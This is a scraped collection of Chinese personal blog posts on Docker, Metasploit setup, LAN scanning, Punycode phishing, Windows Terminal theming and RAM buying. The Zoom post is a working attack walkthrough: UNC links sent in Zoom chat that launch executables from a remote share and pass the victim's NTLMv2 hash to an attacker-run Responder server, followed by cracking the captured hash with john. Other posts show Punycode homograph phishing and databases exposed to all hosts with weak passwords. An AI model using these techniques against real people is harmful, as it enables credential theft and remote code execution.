's!^(\\s*CustomLog)\\s+\\S+!\\1 /proc/self/fd/1!g' \\ -e 's!^(\\s*ErrorLog)\\s+\\S+!\\1 /proc/self/fd/2!g' \\ \"$HTTPD_PREFIX/conf/httpd.conf\" \\ \\ &amp;&amp; apt-get purge -y --auto-remove $buildDepsCOPY httpd-foreground /usr/local/bin/EXPOSE 80CMD [\"httpd-foreground\"] TOMCAT7构建过程构建 1234567891011121314# 降低权限配置tomcat用户,并将/opt/tomcat作为主目录RUN groupadd tomcat &amp;&amp; useradd -s /bin/false -g tomcat -d /opt/tomcat tomcat# 下载并解压tomcat文件RUN wget http://apache.mirrors.tds.net/tomcat/tomcat-7/v7.0.20/bin/apache-tomcat-7.0.20.tar.gz &amp;&amp; tar -xzvf apache-tomcat-7*tar.gz -C /opt/tomcat --strip-components=1 ARG /opt/tomcatRUN chgrp -R tomcat conf &amp;&amp; chmod g+rwx conf &amp;&amp; chmod g+r conf/* &amp;&amp; chown -R tomcat webapps/ work/ temp/ logs/ # 通过 update-java-alternatives -l 命令查询jdk安装路径为 /usr/lib/jvm/java-1.6.0-openjdk-amd64# 添加tomcat到服务RUN touch /etc/systemd/system/tomcat.service &amp;&amp; echo -e '[Unit]\\nDescription=Apache Tomcat Web Application Container\\nAfter=network.target\\n \\n[Service]\\nType=forking\\n \\nEnvironment=JAVA_HOME=/usr/lib/jvm//usr/lib/jvm/java-1.6.0-openjdk-amd64/jre\\nEnvironment=CATALINA_PID=/opt/tomcat/temp/tomcat.pid\\nEnvironment=CATALINA_HOME=/opt/tomcat\\nEnvironment=CATALINA_BASE=/opt/tomcat\\nEnvironment='CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC'\\nEnvironment='JAVA_OPTS=-Djava.awt.headless=true -Djava.security.egd=file:/dev/./urandom'\\n \\nExecStart=/opt/tomcat/bin/startup.sh\\nExecStop=/opt/tomcat/bin/shutdown.sh\\n \\nUser=tomcat\\nGroup=tomcat\\n \\n[Install]\\nWantedBy=multi-user.target' &gt; /etc/systemd/system/tomcat.service &amp;&amp; systemctl daemon-reload &amp;&amp; systemctl enable tomcat &amp;&amp; systemctl start tomcatEXPOSE 8080 缓存(可以–no-cache) 完事儿 Docker优化阶段性调试我们查看一下Dockerfile内容 123456789# 构架装有curl的ubuntu镜像FROM nginx# 作者信息MAINTAINER menzel3 \"233333@m.com\"RUN wget www.menzel3.fun &gt; /var/www/html/index.htmlEXPOSE 80 我们给这个中间层镜像一个标签 1docker tag c262876003c2 docker_debug 进入镜像调试bug 123mzl@ubuntu:~/docker/Nginx$ docker run -it --name docker_bug docker_debug /bin/bashroot@313292ae9385:/# wget www.menzel3.fun &gt; /var/www/html/index.htmlbash: /var/www/html/index.html: No such file or directory 修改Dockerfile文件，然后build到成功为止 多阶段构建缺点：管理Dockerfile与数据卷 优点：优化镜像大小 下面再Dockerfile文件中使用多阶段构建； 1、该Dockerfile中有两个FROM为两步构建，在Maven基础镜像中编译生成Jar、依赖，这阶段命名为：BUILD 2、使用linx/alpine-jdk8:0.1作为基础镜像，设置环境、创建目录，更重要的是使用COPY –from把BUILD阶段生成的项目文件拷贝到镜像中； 12345678910111213141516171819202122232425262728FROM maven:3.5-jdk-8 as BUILDCOPY src /usr/app/srcCOPY pom.xml /usr/appCOPY ./docker/start.sh /usr/app/RUN mvn -f /usr/app/pom.xml clean package -U -Dmaven.test.skip=trueRUN mvn -f /usr/app/pom.xml dependency:copy-dependenciesFROM linx/alpine-jdk8:0.1# 设置localeENV LANG en_US.UTF-8ENV LANGUAGE en_US:enENV LC_ALL en_US.UTF-8ENV TZ=Asia/ShanghaiRUN mkdir /app_homeWORKDIR /app_homeCOPY --from=BUILD /usr/app/target/nettyDemo-1.0-SNAPSHOT.jar /app_homeCOPY --from=BUILD /usr/app/target/dependency /app_home/dependencyCOPY --from=BUILD /usr/app/start.sh /app_homeCOPY ./docker/start.sh /app_home/RUN chmod +x /app_home/start.shCMD /app_home/start.sh Docker缺陷兼容问题我们都知道Docker与虚拟机的一个区别就是，Docker与宿主公用一个操作系统内核，在内核及用户空间中运行不兼容或者未经测试的glibc组合版本很可能引发意料之外的行为。 内存问题某一个场景，内存充足，但是系统提示 No space left on device(磁盘空间不足) 通过命令 sudo dumpe2fs -h /dev/sda1 查看某个盘符空闲inode节点与block块 参考链接 安全问题当有一个docker镜像服务沦为肉鸡，那么会发生什么事情呢？ Docker源问题Docker提供了docker hub可以让用户上传创建的镜像，以便其他用户下载，快速搭建环境。但同时也带来了一些安全问题。下载的镜像被恶意植入后门，传输的过程中镜像被篡改， 镜像所搭建的环境是否本身就包含漏洞等等，不一而足。主要介绍下面三种： 1.黑客上传恶意镜像 如果有黑客在制作的镜像中植入木马，后门等恶意软件，那么环境从一开始就已经不安全了，后续更没有什么安全可言。 2.镜像使用有漏洞的软件 据一些报告显示，hub上能下载的镜像里面，75%的镜像都安装了有漏洞的软件，所以下载镜像后，需要检查里面软件的版本信息，对应的版本是否存在漏洞，并及时更新打上补丁。 Docker架构缺陷与安全机制容器之间的局域网攻击 同一主机上的容器之间可以构成局域网，因此针对局域网的ARP欺骗，嗅探，广播风暴等攻击方式便可以用上。所以在一个主机上部署多个容器需要合理的配置网络，设置iptable规则。 DDoS攻击耗尽资源 cgroups安全机制就是要防止此类攻击的，不要为单一的容器分配过多的资源即可避免此类问题。 调用有漏洞的系统调用 我们都知道Docker与虚拟机的一个区别就是，Docker与宿主公用一个操作系统内核，一旦宿主内核存在可以横向越权或者提权漏洞，那么尽管Docker使用普通用户执行，一旦容器被入侵，攻击者还是可以利用内核漏洞逃逸到宿主，做更多事情。 共享root 如果以root权限运行容器，容器内的root用户也就拥有了宿主机的root权限。 未隔离的文件系统 虽然Docker已经对文件系统进行隔离，但是有一些重要的系统文件暂时没有被隔离，如/sys, /proc/sys, /proc/bus等。","link":"/2018/07/31/2018/dockerfile%E4%BD%BF%E7%94%A8/"},{"title":"Metasploit","text":"听老师傅的话，多学学内网渗透。 MSF配置postgresql笔者安装环境 123456- kaliLinux kali 4.17.0-kali1-amd64 #1 SMP Debian 4.17.8-1kali1 (2018-07-24) x86_64 GNU/Linux- msfmetasploit v4.17.3-dev- postgresqlpsql (10.4 (Debian 10.4-2)) 1、启动postgresql，然后设置开机自启 postgresql默认是不启动的所以需要启动服务，如果不想开机自启可以不执行第二条语句 12service postgresql startupdate-rc.d postgresql enable 2、通过命令进入配置 12345sudo -u postgres psqlALTER USER postgres WITH PASSWORD '123.com';注意1：'123.com'这个是密码.注意2：分号！！！！一定要带上分号\";\".注意3：\\q：退出数据库 3、修改linux系统的postgres用户的密码（密码与数据库用户postgres的密码相同） 123456root@kali:~# sudo passwd -d postgrespasswd：密码过期信息已更改。root@kali:~# sudo -u postgres passwd输入新的 UNIX 密码：重新输入新的 UNIX 密码：passwd：已成功更新密码 4、修改PostgresSQL数据库配置实现远程访问 1vim /etc/postgresql/9.4/main/postgresql.conf 更改#listen_addresses='localhost'为listen_addresses = '*' 1vim /etc/postgresql/9.4/main/pg_hba.conf 在文档末尾加上以下内容(不要缺斤少两，就是6个，不是5个) 12# to allow your client visiting postgresql serverhost all all 0.0.0.0 0.0.0.0 md5 注意：一定要把#删除掉，这是注释符 重启服务 1service postgresql restart 5、管理PostgreSQL用户和数据库 12345678910root@kali:~# psql -U postgres -h 127.0.0.1用户 postgres 的口令：psql (9.4.6)SSL连接 (协议: TLSv1.2, 加密：ECDHE-RSA-AES256-GCM-SHA384，二进制位: 256, 压缩比: 关闭)输入 \"help\" 来获取帮助信息. postgres=# create user \"msf123\" with password '123456' nocreatedb;CREATE ROLEpostgres=# create database \"msf1\" with owner=\"msf123\";CREATE DATABASEpostgres=# \\q 命令执行后有返回结果才是执行成功了。 6、msf配置连接 12345678msfconsolemsf &gt; db_status [*] postgresql selected, no connectionmsf &gt; db_connect msf123:123456@127.0.0.1/msf1[*] Rebuilding the module cache in the background...msf &gt; db_status [*] postgresql connected to msf1msf &gt; 在msf启动后连接数据库就好。 msf123:123456这个是步骤4中的create user &quot;msf123&quot; with password '123456' nocreatedb;所建立的。127.0.0.1指本机msf1为数据库名称 7、msf自动连接 123456msf &gt; db_connect -y /usr/share/metasploit-framework/config/database.yml[-] postgresql already connected to msf[-] Run db_disconnect first if you wish to connect to a different databasemsf &gt; exitcp /usr/share/metasploit-framework/config/database.yml.example /usr/share/metasploit-framework/config/database.ymlvim /usr/share/metasploit-framework/config/database.yml 修改配置文件如下： 1234567891011121314151617181920212223242526272829303132# To set up a metasploit database, follow the directions hosted at:# http://r-7.co/MSF-DEV#set-up-postgresql## Kali Linux and the Omnibus installers both include an easy wrapper script for# managing your database, which may be more convenient than rolling your own.development: &amp;pgsql adapter: postgresql database: msf_0 username: mzl_msf password: 123456 host: localhost port: 5432 pool: 200 timeout: 5# You will often want to seperate your databases between dev# mode and prod mode. Absent a production db, though, defaulting# to dev is pretty sensible for many developer-users.production: &amp;production &lt;&lt;: *pgsql# Warning: The database defined as \"test\" will be erased and# re-generated from your development database when you run \"rake\".# Do not set this db to the same as development or production.## Note also, sqlite3 is totally unsupported by Metasploit now.test: &lt;&lt;: *pgsql database: metasploit_framework_test username: metasploit_framework_test password: ___________________________ 我们再次进入msf，使用db_status即可查看当前数据库连接情况 注意： [*] postgresql connected to msf1表明数据库链接成功 如果postgresql版本大于10.5，默认端口为5433，参考度娘修改端口","link":"/2018/08/20/2018/msf%E5%AD%A6%E4%B9%A0/"},{"title":"内网扫描工具","text":"统计最近使用内网扫描工具 嗅探工具arp-scan内网扫描 原理：基于ARP协议发送的数据包 优点：只要主机存活，就一定会扫描出来 缺点：会留下扫描痕迹，局限于内网扫描 123456arp-scan -interface=[网卡名称] --localnetarp-scan --interface=[网卡名称] 192.168.0/24例如:arp-scan -interface=eth0 --localnetarp-scan --interface=eth0 192.168.10.0/24 arping命令不好用，但是单撸还行 优点：不好用 缺点：不好用 12345678910arp [ip] -c nn为发包数量，ip为指定ip地址事例如下arping 192.168.10.140 -c 1不存在则返回：ARPING 192.168.10.140 from 192.168.10.104 eth0Sent 1 probes (1 broadcast(s))Received 0 response(s) fpingfping的主要参数有以下两个： 12345-a：只显示存活主机-u：只显示不存活主机-l：循环ping 目标IP地址的输入方式： 12345fping IP1 IP2 IP3 ...fping -f filenamefping -g IP1 IP2 (IP1地址开始范围，IP2地址结束范围) nmap选项1234-A 全面进攻性扫描-v 显示扫描过程-p [left, right] 扫描端口范围为[left, right]，例如 -p 20-80 指定扫描端口范围为 [20,80]-T[n] n表示扫描等级，简单来说n越大，延迟越短 命令解释T选项解释Nmap提供了一些简单的 方法，使用6个时间模板，使用时采用-T选项及数字(0 - 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)。前两种模式用于IDS躲避，Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。默认模式为Normal，因此-T3 实际上是未做任何优化。Aggressive模式假设用户具有合适及可靠的网络从而加速 扫描。Insane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。 用户可以根据自己的需要选择不同的模板，由Nmap负责选择实际的时间值。 模板也会针对其它的优化控制选项进行速度微调。例如，-T4 针对TCP端口禁止动态扫描延迟超过10ms，-T5对应的值为5ms。 模板可以和优化调整控制选项组合使用，但模板必须首先指定，否则模板的标准值 会覆盖用户指定的值。建议在扫描可靠的网络时使用 -T4，即使 在自己要增加优化控制选项时也使用(在命令行的开始)，从而从这些额外的较小的优化 中获益。 如果用于有足够的带宽或以太网连接，仍然建议使用-T4选项。 有些用户喜欢-T5选项，但这个过于强烈。有时用户考虑到避免使主机 崩溃或者希望更礼貌一些会采用-T2选项。他们并没意识到-T Polite选项是如何的慢，这种模式的扫描比默认方式实际上要多花10倍的时间。默认时间 选项(-T3)很少有主机崩溃和带宽问题，比较适合于谨慎的用户。不进行 版本检测比进行时间调整能更有效地解决这些问题。 虽然-T0和-T1选项可能有助于避免IDS告警，但 在进行上千个主机或端口扫描时，会显著增加时间。对于这种长时间的扫描，宁可设定确切的时间 值，而不要去依赖封装的-T0和-T1选项。 T0选项的主要影响是对于连续扫描，在一个时间只能扫描一个端口， 每个探测报文的发送间隔为5分钟。T1和T2选项比较类似， 探测报文间隔分别为15秒和0.4秒。T3是Nmap的默认选项，包含了并行扫描。 T4选项与 --max-rtt-timeout 1250 --initial-rtt-timeout 500 等价，最大TCP扫描延迟为10ms。T5等价于 --max-rtt-timeout 300 --min-rtt-timeout 50 --initial-rtt-timeout 250 --host-timeout 900000，最大TCP扫描延迟为5ms。","link":"/2018/06/01/2018/%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"},{"title":"docker易用工具","text":"收录一些易用的Docker工具 Docker镜像版本枚举123456789101112131415161718192021222324252627#!/bin/bashif [ $# -lt 1 ]thencat &lt;&lt; HELPdockertags -- list all tags for a Docker image on a remote registry.EXAMPLE: - list all tags for ubuntu: dockertags ubuntu - list all php tags containing apache: dockertags php apacheHELPfiimage=\"$1\"tags=`wget -q https://registry.hub.docker.com/v1/repositories/${image}/tags -O - | sed -e 's/[][]//g' -e 's/\"//g' -e 's/ //g' | tr '}' '\\n' | awk -F: '{print $3}'`if [ -n \"$2\" ]then tags=` echo \"${tags}\" | grep \"$2\" `fiecho \"${tags}\" 使用方法保存为 search.sh，然后给予相应的权限： 12$ chmod 711 search.sh$ ./search.sh [关键词] 查询案例查询P神vulhub所有的php镜像版本 123456789101112131415$ ./search.sh vulhub/php5-fpm5.3-apache5.3-fpm5.4-apache5.5-apache5.6-apache5.6.12-apache5.6.23-fpm7-fpm7.0-apache7.1-apache7.1.12-apache7.1.4-apachexxe 查询所有php5.6版本 123456$ ./search.sh php | grep 5.6mzl@ubuntu:~/shell$ ./getDockerByTag.sh php | grep 5.65.65.6-alpine5.6-alpine3.4... 此处省略一千行","link":"/2018/08/20/2018/docker%E6%98%93%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"title":"易容术之PUNYCODE","text":"Web中URL的易容术 0x0 知识点 Punycode URL编码 Punycode是浏览器使用的特殊编码，目的是将Unicode字符转义成字符数目有限的ASCII 码字符集（A-Z，0-9），由国际化域名（IDN）系统支持。 比如说，中文域名“短.co”用Punycode来表示就是“xn–s7y.co”。这个漏洞所依赖的基础是：浏览器只将单一语言采用的Unicode编码转换为Ponycode URL （比如汉语或者日语），但是如果一个域名当中包含来自多个语言的字符，浏览器就无法分辨了。 研究人员利用这个漏洞注册了xn–80ak6aa92e.com域名，绕过了保护，并在所有存在上述漏洞的浏览器中显示为“apple.com”，包括Chrome、Firefox和Opera，不过IE、Edge、Safari、Brave、Vivaldi并不存在该漏洞。 此处的xn前缀是一个“ASCII兼容编码”前缀，意味着浏览器采用Punycode编码来代表Unicode字符，因为Zheng用到了斯拉夫语的“а” （U+0430）而非ASCII的“a”（U+0041），浏览器的防御措施也就失效了。 Unicode域名 使用Unicode编码注册的域名 Punycode Phishing 同形异义字钓鱼攻击 Punycode Phishing 所依赖的基础则是：浏览器只将单一语言采用的 Unicode 编码转换为Ponycode URL （比如汉语或者日语），但是如果一个域名当中包含来自多个语言的字符，浏览器就无法分辨了。因此，攻击者就可以利用这个特点，发起 Punycode Phishing。例如罗马字母中的 I, E, A,Y, T, O 等与希腊字母、西里尔字母的外形一样，它们会被浏览器处理成不同的字符，但是最终在地址栏里显示的结果却是一样的。 0x1 漏洞利用尝试以下运行shell 。与. &lt;script src='//www。baidu。com'&gt;&lt;/script&gt; “а” （U+0430）与非ASCII的“a”（U+0041） 1234&gt;&gt;&gt; ascii('a')\"'a'\"&gt;&gt;&gt; ascii('а')\"'\\\\u0430'\" 百度URL www。baidu。com 在线工具 在线IDN加密 Unicode编码集 0x2 防护方式Firefox用户缓解方案Firefox用户可根据以下步骤，手动开启缓解方法： 在浏览器地址栏中输入about:config，并按回车键。 在搜索栏中输入Punycode。 浏览器设置将显示network.IDN_show_punycode参数，双击或者右键选择Toggle，将值改为“True”。 Chrome和Opera中并没有类似的设置，来手动关闭Punycode URL转义，所以Chrome用户请耐心等待几周，等待Stable 58发布。 同时也建议用户在手动输入重要网站URL，包括Gmail、Facebook、Twitter、Yahoo及银行网站，不要点击某些网站或者邮件当中的上述网站链接，避免遭遇此钓鱼攻击。 0x3 参考文章 LZ1Y的老歌新唱|PUNYCODE再利用 如何使用Unicode域名进行网络钓鱼攻击?","link":"/2018/07/29/2018/%E6%98%93%E5%AE%B9%E6%9C%AF%E4%B9%8BPUNYCODE/"},{"title":"内存条扫盲选购","text":"最近电脑略卡，准备采购内存条，就学习了一波电脑小常识（2018.8.31更新） 打开任务管理器，你发现你的运行内存占用量经常到70%以上，准备加内存条吧，而如何加呢？以我的电脑为例。 我们获得了四个信息： 已使用插槽：1/4 即目前有1个内存条，还有三个多余坑位（4指当前主板与系统支持的最大内存条数，不一定是卡槽数） 现内存频率：2400 MHZ 因为我是第一次整改我的笔记本，配置都是原生的，我就去中关村查了一下配置，也可以使用CPU-Z这款工具 可以看到，有问题，这里显示我的卡槽只有2个，不看了换一个。 win+R打开cmd命令行，然后输入命令 123&gt; wmic memphysical get maxcapacityMaxCapacity67108864 返回了最大运行内存，67108864KB/1024/1024 = 64GB(也可使用AIDA64工具) 内存条卡槽这里从任务管理器看是有四个，也就是说我们可以插四张内存条。 内存条大小两点原则： 你在计算机方面的需求 CPU支持的最大允许内存 内存条频率通过WIN+R输入cmd进入命令行模式下： 我这里是2400MHZ。 当然这个频率越高越好，但具有水桶效应，计算机的使用的频率 = 内存条中的最低频率 内存条版本通过CPU-Z查看如下信息： 类型为DDR4，故买该版本。 注意点 主板支持DDR3与DDR4意思是：你可以使用DDR3或DDR4，但你不能同时使用两者 金士顿骇客神条金士顿内存条按系列可分为：普通（KVR经典内存）和骇客神条两种系列。 普通内存条 具备较高的性价比，适合家用，注重性价比的用户推荐。 骇客神条 运行稳定性更加可靠。与普通内存条相比更适合超频使用的，其发热性和系统兼容，以及超频稳定性更加好。 内存双通道原理看这里 双通道规则 匹配的对称的内存插槽位置。 相同的内存参数。（相同的内存品牌，相同的时序，相同的频率） 相同的内存大小。 双通道固然能使性能整体翻倍，但是大家也要看自己的需求，反正我是双通道了~","link":"/2018/08/20/2018/%E5%86%85%E5%AD%98%E6%9D%A1%E6%89%AB%E7%9B%B2%E9%80%89%E8%B4%AD/"},{"title":"考研路漫漫","text":"《有朝一日》 有朝一日，我会赢得整个世界 有朝一日，我将挽回我的损失 有朝一日，我将不停地将过去摔打 珍视我的人，你没有伪装 我将把血肉做成黄金，做成粮食 献给你们庄重与博大 爱我的人啊， 我没有叫你失望 你们的等待， 虽然灰冷而渺茫 但有朝一日，真相将大白于天下 辛酸所凝铸的汗水将一一得到补偿 From 戈麦《有朝一日》","link":"/2019/06/05/2019/2019.%E8%80%83%E7%A0%94%E8%B7%AF%E6%BC%AB%E6%BC%AB/"},{"title":"Zoom UNC injection","text":"学习效率低的时候，就该再找点Bug Test Environment Machine A : windows 1909 | SMB 3 Machine B : windows 1903 | SMB 2 Zoom version : 4.6.8(19178.0323) Remote Code Execute 构造RCE链接 1\\\\127.0.0.1\\C$\\Windows\\System32\\Calc.exe Zoom会议聊天发送链接 如果点击，Windows会弹框提醒$$我们无法确认是谁创建了此文件。是否确实要运行此文件$$点击运行，就会执行 Steal password 利用Responder构建SMB欺骗服务 1234567891011121314151617181920212223242526272829root@kali:~# responder -Awrf -I eth0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR &amp; MDNS Responder 3.0.0.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C[+] Poisoners: LLMNR [ON] NBT-NS [ON] DNS/MDNS [ON][+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [ON] Auth proxy [OFF] SMB server [ON]...[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.[+] Listening for events... 链接构造 1\\\\192.168.222.137\\input everything include null 发送到Zoom 1909的SMB版本为 3，会出现 网络凭据输入窗口，需要用户输入（可用资源诱骗） 1903的SMB版本为 2，不出现 网络凭据输入窗口， get hash 点击以后： 123456[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.[+] Listening for events...[SMB] NTLMv2-SSP Client : 192.168.222.1[SMB] NTLMv2-SSP Username : MicrosoftAccount\\victim[SMB] NTLMv2-SSP Hash : victim::MicrosoftAccount:1d9a7ea887a6d9efkipping previously captured hash for MicrosoftAccount\\victim 样例破解： 1234567891011121314151617root@kali:~# cat passvictim::MicrosoftAccount:1d9a7ea887a6d9ef:1DA65779526FB43564C74CE9E390DD70:0101000000000000C0653150DE09D201304D9CE3528CED1B000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000055AB3AD63676EACBFFBD73F2CB4F4F1D640F1BFD12A09F3008D5E2CAFB2FE09F0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003200320032002E003100330037000000000000000000root@kali:~# john passUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 2 OpenMP threadsProceeding with single, rules:SinglePress 'q' or Ctrl-C to abort, almost any other key for statusWarning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.Almost done: Processing the remaining buffered candidate passwords, if any.Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist123456 (victim)1g 0:00:00:00 DONE 2/3 (2020-04-03 01:27) 14.28g/s 93785p/s 93785c/s 93785C/s 123456..randomUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completed Reference resources Windows flaw lets Zoom leak network credentials, runs code remotely Hacker Fantastic@hackerfantastic Cybercriminals Target Zoom Domains to Distribute Malware","link":"/2020/04/01/2020/0003.Zoom%20UNC%20injection/"},{"title":"terminal改造","text":"学习效率低的时候，就该找点乐子，所以今天决定玩一下wt Windows Terminal在大约3年前，微软就出了一款Terminal，但是一直没有去体验。不过，现在它应该已经优化的非常好，而且有不少用户体验的小玩意。 Install and Deploy简略的看下Readme，我们了解到： Make your terminal incredible：ColorTool Console API Documentation（我未来会不会开发一个mod试试？） The funny Font：Cascadia Code Font Many kinds of way to install the terminal 所以我选择直接去找发行目录， 下载安装Windows Terminal 下载安装Cascadia.ttf Cascadia其他两个ttf笔者也下载试了试，然道行浅，看不出区别，通过文件大小猜测是删减版，所以选最大的安装，双击即可，然后点击安装即可。 Let’s make terminal sexy ？通过阅读colorTool的文档： A big library of schemes：iTerm2-Color-Schemes the commands to use colortool.exe the link to download the latest ColorTool release 12345678910111213141516171819PS &gt; ls 目录: D:\\common\\Terminal Tools\\ColorToolMode LastWriteTime Length Name---- ------------- ------ ----d----- 2020/3/16 12:33 schemes-a---- 2019/4/30 3:28 42888 ColorTool.exePS &gt; git clone https://github.com/mbadolato/iTerm2-Color-Schemes.gitPS &gt; cp .\\iTerm2-Color-Schemes\\schemes\\ .\\schemes\\PS &gt; .\\ColorTool.exe -s3024 Day.itermcolors gYw gYw gYw gYw gYw gYw gYw gYw 3024 Night.itermcolors gYw gYw gYw gYw gYw gYw gYw gYw... (此处省略)PS &gt; .\\ColorTool.exe -d '.\\schemes\\Fahrenheit.itermcolors'Wrote selected scheme to the defaults. emmmmmm，然后好像什么都没有发生，不过先试试看这个主题啥样子。 1PS &gt; .\\ColorTool.exe '.\\schemes\\3024 Day.itermcolors' Oh！My eyes！找了几个能接受的配置，打开 Windows terminal &gt; V (菜单栏上的向下符号) &gt; Settings &gt; profiles.json，部分内容如下： 1234567891011121314151617{ // Make changes here to the cmd.exe profile \"guid\": \"{0caa0dad-35be-5f56-a8ff-aaaaaeaaaaaa}\", \"name\": \"Windows PowerShell\", \"commandline\": \"powershell.exe\", \"colorScheme\": \"Solarized Dark\", // a little beauty //\"colorScheme\": \"cyberpunk\", // a little beauty, like ubuntu terminal //\"colorScheme\": \"Vintage\", // like cyberpunk //\"colorScheme\": \"Solarized Light\", // like the notepad in the phone //\"colorScheme\": \"One Half Light\", // it's not my style, and oh my eyes~ //\"colorScheme\": \"One Half Dark\", // a little beauty //\"colorScheme\": \"Campbell\", //\"colorScheme\": \"Snazzy\", \"fontFace\": \"Cascadia\", \"fontSize\": 12, \"hidden\": false}, 然后文档里写可以设置背景图片，23333，我就试了试gif，果然可以用，但是视频不行… 12345678// 图片绝对路径// 这里的路径 ms-appdata:///Roaming/ 是文档给的一个地址，windows上为// %localappdata%\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\RoamingState\\// 还可以使用 ms-appdata:///Local/， 其地址为：// %localappdata%\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\// 当然，你也可以直接使用，如 C:\\\\user\\\\admin\\\\1.png\"backgroundImage\": \"ms-appdata:///Roaming/stars.ps.png\", \"backgroundImageOpacity\": 0.4, // 透明度，1为不透明，0为不可见 Sexy oh-my-posh查阅资料以后，对比了一下各种美化方案，我决定采用以下方案来救场 - - … Oh-my-posh is so delicious 1234# install the oh-my-poshInstall-Module -Name oh-my-poshInstall-Module posh-git -Scope CurrentUserInstall-Module oh-my-posh -Scope CurrentUser Enter and save the following： 123456if (!(Test-Path -Path $PROFILE )) { New-Item -Type File -Path $PROFILE -Force }notepad $PROFILE# Enter strings: Import-Module posh-gitImport-Module oh-my-poshSet-Theme Darkblood 由于oh-my-posh有一些特殊字符，需要拓展Windows的字体，我使用Delugia的ttf，下载安装后，修改继续配置 123456789101112// I just display where I changed. \"profiles\": { ... \"list\": [ { ... // --- Changed Start --- \"fontFace\" : \"Delugia Nerd Font\", \"fontSize\": 12, // --- Changed End --- }, ... 重新打开powershell，发现还是字符乱码，难道微软提供的这个还不够丰富？ a few moments later，需要 而oh-my-posh提供了几种自带的主题，可以先体验试试，然通过修改之前的配置文件$PROFILE保存即可 12345678Set-Theme AgnosterSet-Theme ParadoxSet-Theme SorinSet-Theme DarkbloodSet-Theme AvitSet-Theme HonukaiSet-Theme FishSet-Theme Robbyrussell Configure the keybindings通过文档我们知道已经默认存在以下快捷键（笔者觉得常用好记的）： name keys 复制/粘贴 左键拉取字符，右键即复制，再次右键即粘贴（继承） 编辑配置 CTRL + ， 下一个Tab CTRL + TAB 上一个Tab CTRL + Shift + TAB 创建 list[0] 的Shell CTRL + Shift + 1（如果是list [n] ，既CTRL + shift + (n-1)，list是配置中存放shell信息的数组） 关闭当前Shell CTRL + Shift + W 但是上下翻滚、查找功能没有，我写了如下的简单配置 1234567891011121314151617181920212223\"keybindings\": [ { \"command\": \"scrollDown\", \"keys\": [ \"pagedown\" ] }, { \"command\": \"scrollUp\", \"keys\": [ \"pageup\" ] }, { \"command\": \"find\", \"keys\": [ \"ctrl+f\" ] }], 分屏未想好怎么设置。。。 我采用的是创建wt2.bat与wt3.bat脚本，并加入环境变量，用于创建分屏，代码如下： 1wt -p \"Windows PowerShell\" -d . ; split-pane -p \"Windows PowerShell\" -d . wt3.bat代码： 1wt -d C:\\ ; split-pane -p \"Windows PowerShell\" ; split-pane -p \"Windows PowerShell\" -d . -H 为啥这么做呢，emmmm，减少记忆成本 Other Contents 增加第三方shell配置模板，如cmder、git-bash等 wt的命令行接口 wt的json配置总览 wt的json配置详情","link":"/2020/03/16/2020/0002.terminal%E6%94%B9%E9%80%A0/"},{"title":"A. Contest for Robots","text":"Codeforces Round #625 (Div. 2, based on Technocup 2020 Final Round TranslatePolycarp正在为机器人筹备第一届编程大赛。它有n个问题，很多机器人将参与其中。每一个机器人解决第i个问题将获得Pi的分数，并且所有被解决的问题i的Pi的总和便是每一个机器人在比赛中的分数。对于每一个问题，Pi是一个不小于1的int值。 。。。 待填坑","link":"/2020/03/10/2020/0001.Contest%20for%20Robots/"},{"title":"Icarus Theme","text":"换一个主题，换一个心情，没人会喜欢负面的我，包括我自己。","link":"/2020/04/03/2020/0005.%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0%E4%B8%BAicarus/"},{"title":"Responder","text":"投毒利器 Responder 基于Python2的开源工具、kali 自带 windows支持差 Responder是LLMNR，NBT-NS和MDNS投毒者，内置HTTP、SMB、MSSQL、FTP、LDAP流氓认证服务器，支持NTLMv1、NTLMv2、LMv2，扩展安全性NTLMSSP和基本HTTP身份验证。主要用于钓鱼服务。 123456789 __.----.-----.-----.-----.-----.-----.--| |.-----.----.| _| -__|__ --| _ | _ | | _ || -__| _||__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR &amp; MDNS Responder 2.3.3.9Author: Laurent Gaffie (laurent.gaffie@gmail.com) 快速入门查看版本信息 1$ responder --version 开启欺骗服务 12345678# 查看网卡名称ifconfig -sIface MTU RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flgeth0 1500 118778 0 0 0 32871 0 0 0 BMRUlo 65536 2382 0 0 0 2382 0 0 0 LRU# 指定网卡投毒responder -I eth0 -wrf 快速配置 ROOT权限使用 Python2环境 12345git clone https://github.com/SpiderLabs/Responder.gitecho -e '#!/bin/bash\\ncd /usr/share/responder/ &amp;&amp; ./Responder.py \"$@\"' &gt; /usr/sbin/responder &amp;&amp; \\chmod +x /usr/sbin/responder 